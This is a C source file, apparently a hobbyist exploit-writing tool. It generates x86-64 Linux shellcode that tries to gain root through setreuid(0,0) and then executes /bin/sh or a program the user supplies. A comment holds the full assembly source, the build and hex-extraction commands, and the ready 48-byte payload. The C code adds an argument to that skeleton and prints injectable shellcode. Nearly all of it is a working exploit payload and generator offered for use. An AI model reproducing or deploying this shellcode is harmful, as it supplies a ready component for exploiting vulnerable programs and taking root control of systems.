/********************************************************
 * Created by antz					
 * I must add a lot of functionalities...coming soon    
 
 The skeleton of shellcode used in the c program is taken by this simple asm program that 
 tries to elevate its privileges to root before to exec a shell
 *********************************************************
 Written by antz
 
 bits 64
SECTION .text
global _start
_start:

;clean main registers

		xor rax, rax
		xor rdi, rdi
		xor rsi, rsi
		xor rdx, rdx

;setreuid(uid_t ruid, uid_t euid)    opcode 0x71;
;rdi and rsi are set to 0 yet
;it tries to become root

		mov al, 0x71
		syscall
		
		xor rax, rax
;execve
		jmp down
up:
		pop rdi
		push rax
		mov rdx, rsp
		push rdi
		mov rsi, rsp
		add rax, 0x3b
		syscall
down:
		call up
		db "/bin/sh"
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;nasm -f elf64 -o test.o test.nasm
;ld -m elf_x86_64 -o test test.o
;for i in $(objdump -d test| grep "^ "|cut -f2); do echo -n '\x'$i;done;echo
;"\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\xb0\x71\x0f\x05\x48\x31\xc0\xeb\x0f\x5f\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05\xe8\xec\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"   
;(LEN = 48)
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 */

#include <stdio.h>
#include <string.h>
#define LEN_SKELETON 165
 
int main(int argc, char **argv)
{
	int i;
	size_t len = strlen(argv[1]);
	unsigned char shellcode[LEN_SKELETON + len*4 + 1];
	unsigned char program[len*4+1];
	
	snprintf(shellcode, LEN_SKELETON, "\\x48\\x31\\xc0\\x48\\x31\\xff\\x48\\x31\\xf6\\x48"
					  "\\x31\\xd2\\xb0\\x71\\x0f\\x05\\x48\\x31\\xc0\\xeb"
					  "\\x0f\\x5f\\x50\\x48\\x89\\xe2\\x57\\x48\\x89\\xe6"
					  "\\x48\\x83\\xc0\\x3b\\x0f\\x05\\xe8\\xec\\xff\\xff\\xff");
 	for(i=0;i<len;i++)
  	{
		//it copies hex values of argv[1] chars into the program buffer
  		snprintf(&program[i*4], sizeof(program)-(i*4),"\\x%02x", (unsigned char*)argv[1][i]);
  	}		

  	len *= 4;
  
  	program[len] = '\0';	
	//We simply append argv[1] to our skeleton shellcode (in other words we call exec with argv[1] as argument)
	strncat(shellcode, program, len);
	
	shellcode[LEN_SKELETON + len]='\0';
	
	printf("%s\n", shellcode);
	
	return 0;


}
